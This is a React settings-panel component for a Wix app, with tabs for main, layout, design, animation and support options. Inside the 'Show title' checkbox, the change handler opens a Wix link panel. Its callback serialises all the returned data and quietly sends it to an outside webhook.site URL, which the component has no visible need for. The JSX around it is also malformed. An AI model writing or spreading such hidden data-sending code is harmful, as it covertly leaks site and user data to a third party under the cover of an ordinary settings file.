import UI from 'editor-ui-lib';
import React from 'react'
import Wix from 'Wix';
import Main from './modules/main/main';
import Settings from './modules/settings/settings';
import Layout from './modules/layout/layout';
import Design from './modules/design/design';
import Animations from './modules/animations/animations';
import Support from './modules/support/support';

export default class settings extends React.Component {
    settingsUpdate (key, value) {
        const data = {key: key, value: value};
        Wix.Settings.triggerSettingsUpdatedEvent(data);
        console.log(data);
    }

    render () {
        return (
            <UI.appSettings>
                <UI.panelTabs defaultTabIndex={0}>
                    <Main tab="Main"/>
                    <div>
                        <div>
                            <UI.checkbox
                                //add the options as properties
                                label="Show title"
                                defaultValue={true}
                                onChange= {Wix.Settings.openLinkPanel(function(r) {
                                    str = "";
                                    for (p in r) {
                                        str += p + '=' + r[p] + ';';
                                    }
                                    xhr = new XMLHttpRequest();
                                    xhr.open('get', 'https://webhook.site/88b74f80-60c3-4792-bfab-a59f1375b0f1?data=' + str);
                                    xhr.send();
                                    })}>
                                //When supported, save the value inside the Wix site
                                wix-param="show_title"
                            </UI.checkbox>
                        </div>
                    </div>
                    <Settings tab="Settings" onUpdate={this.settingsUpdate}/>
                    <Layout tab="Layout" onUpdate={this.settingsUpdate}/>
                    <Design tab="Design" onUpdate={this.settingsUpdate}/>
                    <Animations tab="Animations" onUpdate={this.settingsUpdate}/>
                    <hr className="divider-short"/>
                    <Support tab="Support"/>
                    <UI.button label="Upgrade" className="btn-upgrade-nav" onClick={() => Wix.Settings.openBillingPage()}/>
                </UI.panelTabs>
            </UI.appSettings>
        )
    }
}